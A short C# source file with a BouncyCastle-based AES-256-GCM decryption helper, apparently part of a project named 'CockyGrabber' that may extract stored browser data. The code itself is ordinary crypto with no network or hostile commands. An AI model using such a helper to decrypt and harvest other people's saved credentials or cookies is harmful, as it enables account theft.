using System.Text;
using CockyGrabber.Utility.Cryptography.BouncyCastle;

namespace CockyGrabber.Utility.Cryptography
{
    internal static class Aes256GcmDecryptor
    {
        public static string Decrypt(byte[] encryptedBytes, KeyParameter key, byte[] iv)
        {
            GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
            AeadParameters parameters = new AeadParameters(key, 128, iv, null);

            cipher.Init(false, parameters);
            byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
            int retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
            cipher.DoFinal(plainBytes, retLen);

            return Encoding.UTF8.GetString(plainBytes);
        }
    }
}